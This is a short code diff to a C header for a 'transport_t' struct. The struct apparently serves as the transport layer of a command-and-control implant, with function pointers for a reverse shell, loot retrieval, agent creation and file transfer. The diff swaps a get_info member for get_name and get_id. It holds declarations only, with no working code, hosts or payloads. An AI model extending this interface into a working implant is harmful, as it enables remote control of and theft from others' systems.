@@ -14,7 +14,6 @@ typedef struct _transport {
     int (*download_file)(char *ptr, int is_manager, char *extra);
     int (*get_loot)(char *loot);
     int (*upload_file)(char *ptr, int is_module);
-    int (*get_info)(char *ptr);
     int (*init_reverse_shell)(char *id);
     int (*determine_handler)();
     
@@ -23,5 +22,7 @@ typedef struct _transport {
 
     int (*make_agent)(char *dat_ptr, char *d_ptr);
     pClientDat (*get_data)();
+    char* (*get_name)();
+    int (*get_id)();
 } transport_t, *ptransport_t;
 
